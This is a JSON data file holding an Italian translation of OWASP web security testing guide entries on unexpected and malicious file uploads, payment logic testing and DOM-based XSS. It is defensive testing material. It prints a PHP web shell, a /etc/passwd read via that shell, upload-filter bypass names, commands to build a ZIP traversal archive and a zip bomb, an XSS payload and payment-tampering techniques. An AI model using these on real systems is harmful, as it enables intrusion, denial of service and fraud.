tecniche di bypass.</li></ul>",
      "how-to": "<h3>How to Test</h3><p>Questo test si basa sull’osservazione di tutte le altre attività di test: durante i test, annota se l’app presenta comportamenti difensivi attivi:</p><ul><li>Risposte modificate</li><li>Blocco richieste</li><li>Logout o blocco account</li></ul><p>Queste difese possono essere locali (es. blocco temporaneo, rifiuto input) ma servono anche difese generali contro: forced browsing, accesso disordinato, payload “evidenti”, eccesso di richieste, ecc. Se nessuna difesa viene rilevata, va segnalato.</p><h3>Related Test Cases</h3><p>Tutti gli altri test case sono rilevanti.</p>",
      "tools": "",
      "remediation": "<h3>Remediation</h3><p>L’applicazione deve implementare difese attive contro abusi e attaccanti.</p><h3>References</h3><ul><li>Software Assurance, US Department Homeland Security</li><li>IR 7684 Common Misuse Scoring System (CMSS), NIST</li><li>Common Attack Pattern Enumeration and Classification (CAPEC), Mitre</li><li>OWASP AppSensor Project</li><li>Watson C, Coates M, Melton J, Groves G, Creating Attack-Aware Software Applications with Real-Time Defenses, CrossTalk The Journal of Defense Software Engineering, Vol. 24, No. 5, Sep/Oct 2011</li></ul>",
      "test_objectives": ""
    },
    "WSTG-BUSL-08": {
      "summary": "<h3>Sommario</h3><p>Molti processi di business delle applicazioni prevedono la possibilità di caricare e manipolare dati tramite file inviati dagli utenti. Tuttavia, il processo di business deve controllare i file e consentire solo determinati tipi di file 'approvati'. La definizione di quali file siano 'approvati' dipende dalla logica di business ed è specifica per ogni applicazione o sistema. Il rischio è che, permettendo agli utenti di caricare file, un attaccante possa inviare un file di tipo imprevisto che potrebbe essere eseguito e avere un impatto negativo sull’applicazione o sul sistema, tramite attacchi come defacement, esecuzione di comandi remoti, esplorazione dei file di sistema, accesso alle risorse locali, attacco ad altri server o sfruttamento di vulnerabilità locali, solo per citarne alcuni.</p><p>Le vulnerabilità relative all’upload di file di tipo non previsto sono particolari, in quanto il sistema dovrebbe rifiutare rapidamente un file se non ha una specifica estensione. Inoltre, si differenziano dal caricamento di file dannosi, poiché nella maggior parte dei casi un formato di file errato può non essere di per sé 'malevolo', ma può risultare dannoso per i dati salvati. Ad esempio, se un’applicazione accetta file Excel di Windows, ma viene caricato un file di database simile, questo potrebbe essere letto ma i dati estratti potrebbero essere memorizzati in posizioni errate.</p><p>L’applicazione può aspettarsi solo determinati tipi di file per l’elaborazione, come file .csv o .txt. Potrebbe non validare il file caricato solo in base all’estensione (validazione a bassa sicurezza) oppure anche in base al contenuto (validazione ad alta sicurezza). Ciò può portare a risultati inattesi sul sistema o sul database o offrire ulteriori vettori di attacco agli aggressori.</p><p>Supponiamo che un’applicazione di condivisione immagini consenta agli utenti di caricare file grafici .gif o .jpg. Cosa succede se un attaccante riesce a caricare un file HTML con un tag <script> o un file PHP? Il sistema potrebbe spostare il file dalla posizione temporanea a quella finale, dove il codice PHP può essere eseguito contro l’applicazione o il sistema.</p><h3>Obiettivi del test</h3><ul><li>Revisionare la documentazione del progetto per i tipi di file che vengono rifiutati dal sistema.</li><li>Verificare che i tipi di file non consentiti vengano rifiutati e gestiti in modo sicuro.</li><li>Verificare che l’upload multiplo di file sia sicuro e non consenta bypass delle misure di sicurezza impostate.</li></ul>",
      "how-to": "<h3>Come testare</h3><ul><li>Studiare i requisiti logici dell’applicazione.</li><li>Preparare una libreria di file 'non approvati' per il caricamento, che può includere file come: jsp, exe o HTML contenenti script.</li><li>Nell’applicazione, navigare verso la funzione di invio o caricamento dei file.</li><li>Provare a caricare i file 'non approvati' e verificare che vengano effettivamente bloccati.</li><li>Verificare se il sito effettua controlli del tipo di file solo tramite JavaScript lato client.</li><li>Verificare se il sito controlla il tipo di file solo tramite il campo “Content-Type” nella richiesta HTTP.</li><li>Verificare se il sito controlla il tipo di file solo tramite estensione del file.</li><li>Verificare se altri file caricati possono essere acceduti direttamente tramite URL specifico.</li><li>Verificare se il file caricato può contenere codice o script injection.</li><li>Verificare se esiste un controllo sui percorsi dei file caricati. In particolare, gli attaccanti potrebbero comprimere file con un percorso specificato in uno ZIP, così che i file estratti possano essere caricati in percorsi voluti dopo il caricamento e l’estrazione.</li></ul><h3>Casi di test correlati</h3><ul><li>Test gestione estensioni di file per informazioni sensibili</li><li>Test upload di file dannosi</li></ul>",
      "tools": "",
      "remediation": "<h3>Rimedi</h3><p>Le applicazioni dovrebbero essere sviluppate con meccanismi che permettano solo l’accettazione e la manipolazione di file 'accettabili', ovvero file che il resto della funzionalità applicativa è pronta a gestire ed elabora secondo le aspettative. Alcuni esempi specifici includono: denylist o allowlist di estensioni di file, utilizzo del 'Content-Type' dall’header, oppure l’utilizzo di un riconoscitore di tipo file, sempre per consentire solo i tipi di file previsti nel sistema.</p><h3>Riferimenti</h3><ul><li>OWASP - Unrestricted File Upload</li><li>Best practice per la sicurezza nell’upload dei file: bloccare upload malevoli</li><li>Prevenire upload di file PHP malevoli tramite form</li><li>CWE-434: Caricamento senza restrizioni di file con tipo pericoloso</li></ul>",
      "test_objectives": ""
    },
    "WSTG-BUSL-09": {
      "summary": "<h3>Sommario</h3><p>Molti processi di business delle applicazioni consentono agli utenti di caricare dati. Sebbene la validazione dell’input sia ampiamente compresa per i campi di testo, implementarla per i file caricati è molto più complesso. Molti siti adottano semplici restrizioni basate su una lista di estensioni consentite o bloccate, ma ciò non basta a prevenire l’upload di tipi di file apparentemente legittimi ma dal contenuto dannoso.</p><p>Le vulnerabilità relative all’upload di file malevoli sono peculiari, in quanto tali file possono essere facilmente respinti implementando nella logica di business uno scanner dei file durante il caricamento, che respinga quelli percepiti come malevoli. Inoltre, si differenziano dall’upload di file inattesi perché, mentre il tipo di file può essere accettato, il contenuto può comunque essere dannoso per il sistema.</p><p>Infine, 'malevolo' significa cose diverse a seconda dei sistemi: ad esempio, file che sfruttano vulnerabilità SQL Server potrebbero non essere considerati pericolosi in un ambiente NoSQL.</p><p>L’applicazione può consentire il caricamento di file malevoli contenenti exploit o shellcode senza sottoporli a scansione. Tali file potrebbero essere intercettati e fermati in vari punti dell’architettura: sistemi IDS/IPS, antivirus lato server o tramite una scansione fatta dall’applicazione stessa (magari delegando la scansione tramite SCAP).</p><p>Un esempio tipico è un’app come blog o forum che consente agli utenti di caricare immagini e altri file multimediali. Sebbene questi siano generalmente sicuri, se un attaccante può caricare codice eseguibile (ad esempio uno script PHP), potrebbe riuscire a eseguire comandi sul sistema operativo, leggere e modificare il filesystem, accedere al database e compromettere completamente il server.</p><h3>Obiettivi del test</h3><ul><li>Identificare le funzionalità di upload file.</li><li>Verificare nella documentazione del progetto quali tipi di file siano considerati accettabili e quali invece pericolosi o malevoli. Se la documentazione non è disponibile, valutare cosa sarebbe appropriato in base alla finalità dell’applicazione.</li><li>Determinare come vengono gestiti i file caricati.</li><li>Ottenere o creare una serie di file malevoli per il test.</li><li>Provare a caricare i file malevoli nell’applicazione e determinare se vengono accettati e processati.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Il controllo più semplice che un’applicazione può implementare è consentire l’upload solo di tipi di file attendibili.</p><p>Se il server è configurato per eseguire codice, può essere possibile ottenere l’esecuzione di comandi caricando una web shell, che permette l’esecuzione arbitraria di comandi o codice. Perché questo attacco abbia successo, il file deve essere caricato nella webroot e il server deve essere configurato per eseguire il codice.</p><p>Caricare questo tipo di shell su un server esposto a Internet è pericoloso perché chiunque ne conosca (o indovini) la posizione può eseguire comandi sul server. Ci sono varie tecniche per proteggere la shell da accessi non autorizzati, come:</p><ul><li>Caricare la shell con un nome randomico</li><li>Proteggerla con password</li><li>Implementare restrizioni IP sulla shell</li></ul><p>Ricorda di rimuovere la shell quando hai terminato.</p><p>L’esempio seguente mostra una semplice web shell PHP che esegue comandi passati nel parametro GET 'cmd' e può essere acceduta solo da un IP specifico:</p><pre><code><?php if ( $_SERVER [ 'REMOTE_HOST' ] === \"FIXME\" ) { // Inserisci qui il tuo IP if ( isset ( $_REQUEST [ 'cmd' ])){ $cmd = ( $_REQUEST [ 'cmd' ]); echo \"<pre> \\n \" ; system ( $cmd ); echo \"</pre>\" ; } } ?></code></pre><p>Una volta caricata la shell (con nome random), puoi eseguire comandi OS passando il comando nel parametro GET 'cmd':</p><p>https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd</p><p>Il primo passo è determinare quali filtri sono attivi e dove sono implementati. Se le restrizioni avvengono lato client tramite JavaScript, sono facilmente bypassabili con un proxy di intercettazione.</p><p>Se il filtro è lato server, esistono varie tecniche per bypassarlo, tra cui:</p><ul><li>Modificare il valore di Content-Type in HTTP, ad esempio impostandolo come image/jpeg</li><li>Modificare l’estensione in una meno comune, come .php5, .shtml, .asa, .jsp, .jspx, .aspx, .asp, .phtml, .cshtml</li><li>Modificare la capitalizzazione dell’estensione, es: file.PhP o file.AspX</li><li>Se la richiesta contiene più nomi di file, modificarli con valori diversi</li><li>Utilizzare caratteri speciali di terminazione come spazi, punti o caratteri nulli: file.asp..., file.php;jpg, file.asp%00.jpg, 1.jpg%00.php</li><li>In versioni mal configurate di Nginx, caricare un file come test.jpg/x.php può consentirne l’esecuzione come x.php</li></ul><p>Dopo la validazione del tipo di file, è importante assicurarsi che anche il contenuto sia sicuro. Questo è molto più complesso perché dipende dal tipo di file consentito.</p><p>Le applicazioni dovrebbero eseguire la scansione antivirus sui file caricati. Il modo più semplice per testare la scansione è utilizzare il file di test EICAR, riconosciuto come malevolo da tutti gli antivirus.</p><p>A seconda dell’applicazione, può essere necessario testare altri tipi di file pericolosi, ad esempio documenti Office con macro malevole. Strumenti come Metasploit Framework e Social Engineer Toolkit (SET) possono generare file malevoli in vari formati.</p><p>Quando viene caricato un file malevolo, dovrebbe essere rilevato e messo in quarantena o eliminato dall’applicazione. A seconda di come viene processato il file, potrebbe non essere subito evidente se ciò sia avvenuto.</p><p>Se l’applicazione estrae archivi (ZIP), può essere possibile scrivere in posizioni non volute tramite directory traversal. Questo si sfrutta caricando un archivio ZIP malevolo che contiene percorsi come ..\\..\\..\\..\\shell.php. Questa tecnica è approfondita nella advisory Snyk.</p><p>Un test contro la Directory Traversal negli archivi dovrebbe includere due fasi:</p><pre><code>Enumeration < ZipEntry > entries = ​ ​ zip ​ . g ​ etEntries (); while ( entries ​ . h ​ asMoreElements ()){ ZipEntry e ​ = ​ entries . nextElement (); File f = new File ( destinationDir , e . getName ()); InputStream input = zip ​ . g ​ etInputStream ( e ); IOUtils ​ . c ​ opy ( input , write ( f )); }</code></pre><p>Per creare un file ZIP che sfrutti la vulnerabilità sopra, segui questi passi:</p><pre><code># Nuovo terminale e struttura di directory mkdir -p a/b/c # File base echo 'base' > a/b/c/base # File con traversal echo 'traversed' > traversed # Verifica struttura tree # Vai nella root a/b/c cd a/b/c # Crea lo zip zip test.zip base ../../../traversed # Verifica contenuto archivio unzip -l test.zip</code></pre><p>Una ZIP bomb (o decompression bomb) è un archivio con una grande quantità di dati compressi che mira a saturare lo spazio disco o la memoria del sistema che cerca di estrarlo. Il formato ZIP è l’esempio più comune, ma anche altri formati (es: gzip) possono essere sfruttati.</p><p>Un esempio semplice: creare un file da 1GB con carattere ripetuto e comprimerlo in 1MB:</p><pre><code>dd if = /dev/zero bs = 1M count = 1024 | zip -9 > bomb.zip</code></pre><p>Esistono altri metodi per aumentare il rapporto di compressione: compressione multilivello, abuso del formato ZIP, archivi ricorsivi ('quine').</p><p>Un attacco ZIP bomb porta al DoS e può aumentare i costi se si usa un cloud auto-scalante. Non eseguire questo test senza autorizzazione scritta.</p><p>I file XML possono essere vulnerabili a XXE e attacchi DoS come 'billion laughs'. Approfondimenti nella guida sul test XML Injection.</p><p>Altri formati di file possono avere rischi specifici, ad esempio:</p><ul><li>Le immagini vanno controllate per la dimensione massima (pixel/frame).</li><li>I CSV possono permettere attacchi di CSV Injection.</li><li>I file Office possono contenere macro o codice PowerShell malevolo.</li><li>I PDF possono includere JavaScript dannoso.</li></ul><p>I formati consentiti vanno esaminati attentamente e testati per eventuali funzionalità pericolose.</p><p>Quando è presente una funzionalità di upload file, è frequente trovare i seguenti metodi nelle sorgenti:</p><ul><li>Java: new file, import, upload, getFileName, Download, getOutputString</li><li>C/C++: open, fopen</li><li>PHP: move_uploaded_file(), Readfile, file_put_contents(), file(), parse_ini_file(), copy(), fopen(), include(), require()</li></ul><h3>Casi di test correlati</h3><ul><li>Test gestione estensioni di file per informazioni sensibili</li><li>Test XML Injection</li><li>Test upload di file inattesi</li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li>Generazione payload Metasploit</li><li>Proxy di intercettazione</li></ul><h3>Riferimenti</h3><ul><li>OWASP - File Upload Cheat Sheet</li><li>OWASP - Unrestricted File Upload</li><li>Perché i form di upload sono un rischio importante</li><li>8 regole base per implementare upload sicuro</li><li>Prevenire upload di file PHP malevoli tramite form</li><li>Come riconoscere un file malevolo</li><li>CWE-434: Caricamento senza restrizioni di file con tipo pericoloso</li><li>Implementare upload sicuro</li><li>Generazione payload Metasploit</li></ul>",
      "remediation": "<h3>Rimedi</h3><p>Proteggersi totalmente dall’upload di file malevoli può essere complesso e i passaggi variano in base ai tipi di file e a come vengono gestiti lato server. Approfondimenti nella File Upload Cheat Sheet.</p>",
      "test_objectives": ""
    },
    "WSTG-BUSL-10": {
      "summary": "<h3>Sommario</h3><p>Molte applicazioni implementano funzionalità di pagamento, inclusi siti e-commerce, abbonamenti, enti di beneficenza, raccolte fondi e piattaforme di cambio valuta. La sicurezza di queste funzionalità è fondamentale, perché vulnerabilità potrebbero permettere ad attaccanti di rubare dall’organizzazione, effettuare acquisti fraudolenti o persino sottrarre dati delle carte di pagamento di altri utenti. Questi problemi potrebbero causare non solo danni reputazionali, ma anche perdite economiche significative, sia per danni diretti che per multe imposte dagli organismi di regolamentazione.</p><h3>Obiettivi del test</h3><ul><li>Determinare se la logica di business per le funzionalità e-commerce è robusta.</li><li>Comprendere come funziona la componente di pagamento.</li><li>Verificare che la funzionalità di pagamento sia sicura.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Esistono diversi modi in cui le applicazioni possono integrare la funzionalità di pagamento, e l’approccio di test varierà a seconda della modalità usata. I metodi più comuni sono:</p><ul><li>Reindirizzare l’utente a un gateway di pagamento di terze parti.</li><li>Caricare un gateway di pagamento di terze parti tramite un IFRAME nell’applicazione.</li><li>Utilizzare un form HTML che invia una richiesta POST cross-domain verso il gateway di pagamento.</li><li>Accettare i dati della carta direttamente e poi inviare una POST dal backend dell’applicazione alle API del gateway di pagamento.</li></ul><p>Il Payment Card Industry Data Security Standard (PCI DSS) è uno standard che le organizzazioni devono seguire per processare pagamenti con carte di debito e credito (anche se va notato che non è una legge). Una trattazione completa dello standard esula da questa guida (e dalla maggior parte dei penetration test), ma è utile per i tester conoscerne alcuni punti chiave.</p><p>Il fraintendimento più comune riguardo al PCI DSS è che si applichi solo ai sistemi che memorizzano dati delle carte (ad esempio, i dettagli delle carte di credito/debito). In realtà si applica a qualsiasi sistema che \"memorizzi, elabori o trasmetta\" queste informazioni. I requisiti da seguire dipendono da quale metodo di integrazione del gateway è stato scelto. La guida Visa Processing E-Commerce Payments offre maggiori dettagli, ma in breve:</p><p>Oltre alle differenze di superficie d’attacco e profilo di rischio di ogni approccio, c’è una differenza significativa anche nel numero di requisiti tra SAQ A (22 requisiti) e SAQ D (329 requisiti) che l’organizzazione deve soddisfare. Per questo è importante segnalare le applicazioni che non utilizzano redirect o IFRAME, poiché rappresentano rischi tecnici e di compliance maggiori.</p><p>La maggior parte dei siti e-commerce permette agli utenti di aggiungere prodotti a un carrello prima di iniziare il checkout. Il carrello deve tenere traccia degli articoli aggiunti e della quantità di ciascuno. Normalmente la quantità dovrebbe essere un intero positivo, ma se il sito non la valida correttamente può essere possibile specificare una quantità decimale (ad esempio 0.1) o negativa (ad esempio -1). A seconda di come viene gestito il backend, aggiungere quantità negative può portare a un valore negativo, riducendo il costo complessivo del carrello.</p><p>Ci sono diversi modi per modificare il contenuto del carrello che andrebbero testati, ad esempio:</p><ul><li>Aggiungere una quantità negativa di un prodotto.</li><li>Rimuovere ripetutamente prodotti finché la quantità diventa negativa.</li><li>Aggiornare la quantità a un valore negativo.</li></ul><p>Alcuni siti forniscono anche un menu a tendina di quantità valide (ad esempio confezioni da 10 pezzi), ma potrebbe essere possibile manipolare le richieste per aggiungere quantità diverse.</p><p>Se tutti i dettagli del carrello vengono passati al gateway di pagamento (anziché solo il valore totale), potrebbe essere possibile manipolare anche questi dati.</p><p>Infine, se l’applicazione è vulnerabile all’HTTP Parameter Pollution può verificarsi un comportamento inatteso passando più volte lo stesso parametro, ad esempio:</p><pre><code>POST /api/basket/add\nHost: example.org\n\nitem_id=1&quantity=5&quantity=4</code></pre><p>Quando si aggiunge un articolo al carrello, l’applicazione dovrebbe includere solo l’ID articolo e la quantità, come nell’esempio:</p><pre><code>POST /api/basket/add HTTP/1.1\nHost: example.org\nitem_id=1&quantity=5</code></pre><p>Tuttavia, in alcuni casi l’applicazione potrebbe includere anche il prezzo, rendendo possibile manipolarlo:</p><pre><code>POST /api/basket/add HTTP/1.1\nHost: example.org\nitem_id=1&quantity=5&price=2.00</code></pre><p>Tipi diversi di prodotti possono avere regole di validazione diverse, quindi ognuno va testato separatamente. Alcune applicazioni permettono anche di aggiungere una donazione opzionale; se non viene validato l’importo, potrebbe essere possibile inserire una donazione negativa che riduce il totale del carrello.</p><p>Se il checkout avviene su un gateway di terze parti, potrebbe essere possibile manipolare i prezzi fra l’applicazione e il gateway.</p><p>Il trasferimento al gateway può avvenire con una POST cross-domain, come nell’esempio HTML seguente:</p><p>Nota: i dati della carta non sono inclusi in questa richiesta – saranno inseriti dall’utente sul gateway.</p><pre><code><form action=\"https://example.org/process_payment\" method=\"POST\">\n  <input type=\"hidden\" id=\"merchant_id\" value=\"123\" />\n  <input type=\"hidden\" id=\"basket_id\" value=\"456\" />\n  <input type=\"hidden\" id=\"item_id\" value=\"1\" />\n  <input type=\"hidden\" id=\"item_quantity\" value=\"5\" />\n  <input type=\"hidden\" id=\"item_total\" value=\"20.00\" />\n  <input type=\"hidden\" id=\"shipping_total\" value=\"2.00\" />\n  <input type=\"hidden\" id=\"basket_total\" value=\"22.00\" />\n  <input type=\"hidden\" id=\"currency\" value=\"GBP\" />\n  <input type=\"submit\" id=\"submit\" value=\"submit\" />\n</form></code></pre><p>Modificando il form HTML o intercettando la POST, si possono modificare i prezzi e acquistare prodotti a prezzo inferiore. Molti gateway rifiutano transazioni con valore zero, ma un totale di 0.01 è più probabile che passi. Alcuni gateway potrebbero anche accettare valori negativi (usati per i rimborsi). Dove ci sono più valori (prezzi articoli, spedizione, totale), tutti vanno testati.</p><p>Se il gateway usa un IFRAME, si può provare a manipolare l’URL dell’IFRAME:</p><pre><code><iframe src=\"https://example.org/payment_iframe?merchant_id=123&basket_total=22.00\" /></code></pre><p>Nota: i gateway sono gestiti da terzi e spesso sono fuori dallo scope del test. Quindi la manipolazione prezzi può essere testata, ma altri attacchi (es: SQL injection) vanno eseguiti solo con approvazione scritta.</p><p>Per prevenire manipolazioni, alcuni gateway cifrano i dettagli della richiesta (ad esempio PayPal con crittografia a chiave pubblica). La prima cosa da provare è inviare una richiesta non cifrata, dato che alcuni gateway accettano transazioni insicure a meno che non siano esplicitamente configurati per rifiutarle.</p><p>Se non funziona, bisogna trovare la chiave pubblica usata per cifrare i dettagli, che potrebbe essere esposta in backup dell’applicazione o accessibile tramite vulnerabilità di directory traversal. In alternativa, è possibile che l’applicazione riutilizzi la coppia chiave pubblica/privata per il gateway e il certificato digitale. Si può recuperare la chiave pubblica dal server con:</p><pre><code>echo -e '\\0' | openssl s_client -connect example.org:443 2>/dev/null | openssl x509 -pubkey -noout</code></pre><p>Una volta ottenuta la chiave, puoi provare a creare una richiesta cifrata (in base alla documentazione del gateway) e inviarla per vedere se viene accettata.</p><p>Altri gateway usano un hash sicuro (o HMAC) sui dettagli della transazione per prevenire manipolazioni. Le modalità variano tra i fornitori (es. Adyen usa HMAC-SHA256), ma di solito coinvolgono i dettagli della transazione e un valore segreto. Un esempio di calcolo hash:</p><pre><code>$secure_hash = md5($merchant_id . $transaction_id . $items . $total_value . $secret)</code></pre><p>Questo valore viene aggiunto alla richiesta POST verso il gateway e usato per verificare che la transazione non sia stata alterata.</p><p>La prima cosa da provare è rimuovere l’hash: alcuni gateway accettano transazioni insicure a meno che non sia configurata la verifica obbligatoria.</p><p>La richiesta POST dovrebbe includere tutti i valori necessari per il calcolo, tranne la chiave segreta. Se si conosce come viene calcolato l’hash (di solito documentato dal provider), si può tentare di brute-forzare il segreto. Se il sito usa un’applicazione preconfezionata, può essere presente un segreto di default nei file di configurazione o nel codice. Se si trova un backup o si accede ai file di configurazione, è possibile trovarlo lì.</p><p>Se riesci a ottenere il segreto, puoi alterare i dettagli della transazione e generare un tuo hash accettato dal gateway.</p><p>Se non è possibile alterare i prezzi, si può tentare di cambiare la valuta utilizzata, specie se il sito supporta più valute. Ad esempio, il sito può validare che il prezzo sia 10, ma se cambi la valuta da GBP a USD, potresti pagare meno.</p><p>Se il valore degli articoli cambia nel tempo (come nei cambi valute), può essere possibile comprare o vendere a un prezzo vecchio intercettando le richieste con un proxy locale e ritardandole. Affinché sia sfruttabile, il prezzo deve essere incluso nella richiesta o collegato a qualcosa nella richiesta (come session o transaction ID). L’esempio seguente mostra come si può sfruttare questo in un’applicazione di acquisto/vendita oro:</p><ul><li>Visualizza il prezzo attuale dell’oro sul sito.</li><li>Avvia una richiesta di acquisto per 1oz d’oro.</li><li>Intercetta e congela la richiesta.</li><li>Attendi un minuto e controlla di nuovo il prezzo: se aumenta, consenti la transazione per acquistare a meno; se diminuisce, annulla la richiesta.</li></ul><p>Se il sito consente pagamenti in criptovaluta (più volatile), può essere possibile sfruttare la variazione tra valore fisso in crypto e la valuta principale del sito.</p><p>Se l’applicazione supporta codici sconto, bisogna verificare:</p><ul><li>I codici sono facilmente indovinabili (TEST, TEST10, SORRY10, nome azienda ecc)?</li><li>Se il codice contiene un numero, si trovano altri codici incrementando il numero?</li><li>Esiste protezione contro il brute-force?</li><li>Si possono applicare più codici sconto contemporaneamente?</li><li>Si possono applicare più volte?</li><li>Si possono usare caratteri jolly (% o *)?</li><li>I codici sconto sono esposti nell’HTML o in campi <input> nascosti?</li></ul><p>Oltre a questo, vanno testate le classiche vulnerabilità come SQL injection.</p><p>Se il checkout coinvolge più fasi (aggiunta prodotti, codici sconto, dettagli spedizione e fatturazione), può essere possibile causare comportamenti non voluti svolgendo i passaggi in ordine diverso. Ad esempio:</p><ul><li>Modificare l’indirizzo di spedizione dopo aver inserito i dati di fatturazione per ridurre i costi di spedizione.</li><li>Rimuovere articoli dopo i dettagli spedizione per evitare il minimo ordine.</li><li>Modificare il carrello dopo aver applicato un codice sconto.</li><li>Modificare il carrello dopo il checkout.</li></ul><p>Potrebbe anche essere possibile saltare l’intero processo di pagamento. Ad esempio, se l’applicazione reindirizza a un gateway, il flusso può essere:</p><ul><li>L’utente inserisce i dati sull’applicazione.</li><li>Viene reindirizzato al gateway di pagamento.</li><li>Inserisce i dati della carta. Se il pagamento va a buon fine, viene reindirizzato a success.php; se fallisce a failure.php sull’applicazione.</li><li>L’app aggiorna il database e processa l’ordine se il pagamento è stato eseguito.</li></ul><p>Se l’applicazione non verifica realmente l’esito del pagamento sul gateway, potrebbe essere possibile forzare la navigazione verso la pagina di successo (includendo magari un transaction ID) e far processare l’ordine come se il pagamento fosse avvenuto. Potrebbe anche essere possibile inviare più richieste a success.php per processare più volte lo stesso ordine.</p><p>Normalmente i merchant pagano commissioni per ogni transazione (una quota fissa più una percentuale). Ricevere pagamenti molto piccoli (es. $0.01) può causare perdite economiche per le commissioni superiori al valore della transazione.</p><p>Questo è raro nei siti e-commerce perché il prezzo minimo degli articoli è generalmente più alto. Tuttavia, se il sito permette pagamenti di importo arbitrario (es. donazioni), controllare che sia imposto un minimo sensato.</p><p>I gateway di pagamento forniscono dettagli di carte di test da usare in ambiente sviluppo/debug. Queste dovrebbero essere accettate solo su sandbox o ambienti di test, ma potrebbero funzionare anche in produzione se mal configurate.</p><p>Esempi di test card per vari gateway:</p><ul><li>Adyen – Test Card Numbers</li><li>Globalpay – Test Cards</li><li>Stripe – Basic Test Card Numbers</li></ul><p>Testare la funzionalità di pagamento può essere complesso, specialmente su siti live. Aspetti da considerare:</p><ul><li>Ottenere dettagli di carte di test per l’applicazione. Se non disponibili, si può usare una carta prepagata o alternativa.</li><li>Tenere traccia degli ordini fatti per poterli annullare e rimborsare.</li><li>Non effettuare ordini che non possono essere annullati o che causano altre azioni (es. spedizione automatica).</li></ul><h3>Casi di test correlati</h3><ul><li>Test HTTP Parameter Pollution</li><li>Test SQL Injection</li><li>Test bypass dei workflow</li></ul>",
      "tools": "",
      "remediation": "<h3>Rimedi</h3><ul><li>Evitare di memorizzare, trasmettere o processare dati di carte ove possibile. Utilizzare sempre redirect o IFRAME verso il gateway di pagamento.</li><li>Utilizzare tutte le funzioni di sicurezza offerte dal gateway (cifratura, hash sicuri).</li><li>Gestire tutte le informazioni di prezzo lato server: lato client inviare solo ID prodotto e quantità.</li><li>Implementare corretta validazione degli input e vincoli di business logic (es. controllo su valori negativi o non validi).</li><li>Garantire che il flusso di pagamento sia robusto e che le fasi non possano essere saltate o alterate nell’ordine.</li></ul><h3>Riferimenti</h3><ul><li>Payment Card Industry Data Security Standard (PCI DSS)</li><li>Visa Processing E-Commerce Payments guidance</li></ul>",
      "test_objectives": ""
    },
    "WSTG-CLNT-01": {
      "summary": "<h3>Sommario</h3><p>Il cross-site scripting basato su DOM (DOM-based XSS) è il nome di fatto per quei bug XSS che sono il risultato di contenuti attivi lato browser su una pagina, tipicamente JavaScript, che ottengono input dell’utente tramite una fonte (<i>source</i>) e lo usano in un “sink”, portando così all’esecuzione di codice iniettato. Questo documento discute solo i bug JavaScript che portano a XSS.</p><p>Il DOM, ovvero Document Object Model, è il formato strutturale utilizzato per rappresentare i documenti in un browser. Il DOM consente agli script dinamici come JavaScript di referenziare componenti del documento come un campo di form o un cookie di sessione. Il DOM viene utilizzato anche dal browser per la sicurezza — ad esempio per impedire che script su domini diversi ottengano cookie di sessione di altri domini. Una vulnerabilità DOM-based XSS può verificarsi quando un contenuto attivo, come una funzione JavaScript, viene modificato da una richiesta appositamente creata in modo che un elemento del DOM possa essere controllato da un attaccante.</p><p>Non tutti i bug XSS richiedono che l’attaccante controlli il contenuto restituito dal server: spesso si può abusare di cattive pratiche di programmazione JavaScript per ottenere lo stesso risultato. Le conseguenze sono le stesse di una tipica vulnerabilità XSS, cambia solo il vettore di consegna.</p><p>Rispetto agli altri tipi di vulnerabilità XSS (riflesso e memorizzato), dove un parametro non sanitizzato viene passato dal server e poi restituito all’utente ed eseguito nel browser, una vulnerabilità DOM-based XSS controlla il flusso del codice usando elementi del DOM insieme a codice creato dall’attaccante per cambiare il flusso stesso.</p><p>A causa della loro natura, le vulnerabilità DOM-based XSS possono essere eseguite in molti casi senza che il server sia in grado di determinare cosa viene realmente eseguito. Questo può rendere molte delle tecniche generali di filtraggio e rilevamento XSS inefficaci contro questi attacchi.</p><p>Questo esempio ipotetico utilizza il seguente codice client-side:</p><pre><code>&lt;script&gt; document . write ( \" Site is at: \" + document . location . href + \" . \" ); &lt;/script&gt;</code></pre><p>Un attaccante può aggiungere <code>#&lt;script&gt;alert('xss')&lt;/script&gt;</code> all’URL della pagina colpita che, una volta eseguito, mostrerà una finestra di alert. In questo caso, il codice aggiunto non viene inviato al server perché tutto ciò che segue il carattere # non è considerato parte della query dal browser, ma come fragment. In questo esempio, il codice viene immediatamente eseguito e viene mostrato l’alert “xss”. A differenza delle più comuni forme di XSS (riflesso e stored, dove il codice viene inviato al server e poi al browser), questo viene eseguito direttamente nel browser dell’utente senza contatto col server.</p><p>Le conseguenze dei bug DOM-based XSS sono ampie quanto quelle delle forme di XSS più note, tra cui il furto di cookie, ulteriori iniezioni di script malevoli, ecc., e devono quindi essere trattate con la stessa gravità.</p><h3>Obiettivi del test</h3><ul><li>Identificare i sink DOM.</li><li>Costruire payload specifici per ogni tipo di sink.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Le applicazioni JavaScript differiscono significativamente dagli altri tipi di applicazioni perché spesso sono generate dinamicamente dal server. Per comprendere quale codice viene eseguito, è necessario effettuare una crawl del sito per determinare tutte le istanze di JavaScript eseguite e dove viene accettato input utente. Molti siti si basano su grandi librerie di funzioni, che spesso raggiungono centinaia di migliaia di righe di codice e non sono state sviluppate internamente. In questi casi, il testing top-down diventa spesso l’unica opzione praticabile, poiché molte funzioni a basso livello non vengono mai usate e analizzarle per capire quali siano i sink richiederebbe più tempo di quello disponibile. Lo stesso vale per il testing top-down se non si identificano subito gli input o la loro mancanza.</p><p>L’input utente arriva in due forme principali:</p><ul><li>Input scritto nella pagina dal server in modo che non permetta XSS diretto, e</li><li>Input ottenuto da oggetti JavaScript client-side.</li></ul><p>Ecco due esempi di come il server può inserire dati nello script JavaScript:</p><pre><code>var data = \" &lt;escaped data from the server&gt; \" ; var result = someFunction ( \" &lt;escaped data from the server&gt; \" );</code></pre><p>Ecco due esempi di input ottenuto da oggetti JavaScript lato client:</p><pre><code>var data = window . location ; var result = someFunction ( window . referrer );</code></pre><p>Anche se il modo in cui vengono recuperati è simile, è importante notare che quando l’input arriva dal server, quest’ultimo può applicare qualsiasi permutazione ai dati che desidera. Al contrario, le permutazioni effettuate dagli oggetti JavaScript sono ben documentate. Se someFunction nell’esempio sopra fosse un sink, l’exploitabilità nel primo caso dipenderebbe dal filtraggio fatto dal server, nel secondo dall’encoding fatto dal browser su window.referrer. Stefano Di Paulo ha scritto un ottimo articolo su cosa restituiscono i browser quando viene richiesto un elemento di un URL tramite attributi document e location.</p><p>Inoltre, JavaScript è spesso eseguito 